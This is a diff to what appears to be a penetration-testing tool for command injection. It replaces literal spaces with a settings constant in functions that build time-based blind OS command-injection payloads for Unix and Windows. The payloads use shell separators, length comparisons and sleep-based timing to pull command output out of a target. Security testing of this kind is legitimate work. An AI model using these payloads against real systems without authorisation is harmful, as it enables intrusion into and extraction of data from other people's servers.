@@ -81,7 +81,7 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                 "[ " + str(output_length) + " -ne $(echo " + TAG + " " + 
+                 "[ " + str(output_length) + " -ne $(echo " + TAG + settings.SINGLE_WHITESPACE + 
                  pipe + "tr -d '\\n' " + pipe + "wc -c) ] " + separator + 
                  "sleep " + str(timesec)
                  )  
@@ -256,7 +256,7 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
       payload = (separator +  " " + 
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 cmd + 
-                "') do if %i==" +str(output_length) + " " +
+                "') do if %i==" +str(output_length) + settings.SINGLE_WHITESPACE +
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
                 )
@@ -266,7 +266,7 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
       payload = (ampersand +  " "
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 cmd + 
-                "') do if %i==" +str(output_length) + " " +
+                "') do if %i==" +str(output_length) + settings.SINGLE_WHITESPACE +
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
                 )
@@ -563,7 +563,7 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
       payload = (separator +  " " + 
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 cmd + 
-                "') do if %i==" +str(ascii_char) + " " +
+                "') do if %i==" +str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
                 )
@@ -574,7 +574,7 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
       payload = (ampersand +  " "
                 "for /f \"tokens=*\" %i in ('cmd /c " +
                 cmd + 
-                "') do if %i==" +str(ascii_char) + " " +
+                "') do if %i==" +str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
                 )
